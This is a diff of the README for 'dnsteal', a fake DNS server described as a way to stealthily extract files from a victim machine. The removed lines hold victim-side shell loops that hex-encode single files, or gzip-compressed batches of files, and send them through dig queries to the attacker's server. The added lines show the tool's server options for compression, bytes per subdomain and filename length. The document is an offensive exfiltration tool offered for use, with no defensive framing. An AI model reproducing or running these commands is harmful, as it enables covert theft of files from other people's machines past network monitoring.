@@ -1,41 +1,36 @@
-# dnsteal
+# dnsteal v 2.0
 
 This is a fake DNS server that allows you to stealthily extract files from a victim machine through DNS requests. 
 
-Below is an image showing an example of how to use:
+Below are a couple of different images showing examples of multiple file transfer and single verbose file transfer:
 
-![Alt text](https://slimgr.com/images/2015/09/27/d7cb61e9105e62f70e2b866b6be55885.png)
+![Alt text](https://www.slimgr.com/images/2015/10/21/e5c21fddae495743f901804091d5b220.png)
+![Alt text](https://www.slimgr.com/images/2015/10/21/96dc39537a81b3f4231cb8ef89a6895b.png)
 
-On the victim machine, you simply can do something like so:
+* Support for multiple files
+* Gzip compression supported
+* Now supports the customisation of subdomains and bytes per subdomain and the length of filename
+
+See help below:
+
+![Alt text](https://www.slimgr.com/images/2015/10/21/b8a6d39ea2ff93ee7d893ed5095a87a4.png)
+
+If you do not understand the help, then just use the program with default options!
 
 ```bash
-for b in $(xxd -p file/to/send.png); do dig @server $b.filename.com; done
+python dnsteal.py 127.0.0.1 -z -v
 ```
 
-**Support for multiple files**
+This one would send 45 bytes per subdomain, of which there are 4 in the query. 15 bytes reserved for filename at the end.
 
 ```bash
-for filename in $(ls); do for b in $(xxd -p $f); do dig +short @server %b.$filename.com; done; done
+python dnsteal.py 127.0.0.1 -z -v -b 45 -s 4 -f 15
 ```
 
-**gzip compression supported**
-
-It also supports compression of the file to allow for faster transfer speeds, this can be achieved using the "-z" switch:
+This one would leave no space for filename.
 
 ```bash
-python dnsteal.py 127.0.0.1 -z
-```
-
-Then on the victim machine send a Gzipped file like so:
-
-```bash
-for b in $(gzip -c file/to/send.png | xxd -p); do dig @server $b.filename.com; done
-```
-
-or for multiple, gzip compressed files:
-
-```bash
-for filename in $(ls); do for b in $(gzip -c $filename | xxd -p); do dig +short @server %b.$filename.com; done; done
+python dnsteal.py 127.0.0.1 -z -v -b 63 -s 4 -f 0
 ```
 
 
